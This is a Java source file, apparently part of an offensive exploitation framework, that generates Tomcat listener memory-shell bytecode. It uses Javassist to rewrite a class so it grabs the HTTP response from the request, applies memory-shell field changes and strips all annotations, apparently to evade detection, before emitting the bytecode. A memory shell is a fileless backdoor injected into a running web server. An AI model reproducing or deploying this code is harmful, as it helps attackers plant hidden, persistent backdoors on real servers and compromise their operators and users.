package com.ppp.middleware.builder;

import com.ppp.JavaClassHelper;
import com.ppp.annotation.Builder;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;
import com.ppp.utils.maker.JavaClassUtils;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

/**
 * @author Whoopsunix
 */
@Builder(Builder.MS)
@Middleware(Middleware.Tomcat)
public class TomcatMSJavaClassBuilder {
    @MemShell(MemShell.Listener)
    public byte[] listener(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        CtMethod ctMethod = ctClass.getDeclaredMethod("getResponse");
        ctMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
                "return httpServletResponse;}");

        // MemShell 信息修改
        MemShellModifier.fieldChange(cls, ctClass, javaClassHelper);

        // 清除所有注解
        JavaClassUtils.clearAllAnnotations(ctClass);

        byte[] classBytes = ctClass.toBytecode();
        return classBytes;
//        String b64 = Encoder.base64encoder(classBytes);
//        return b64;
    }
}
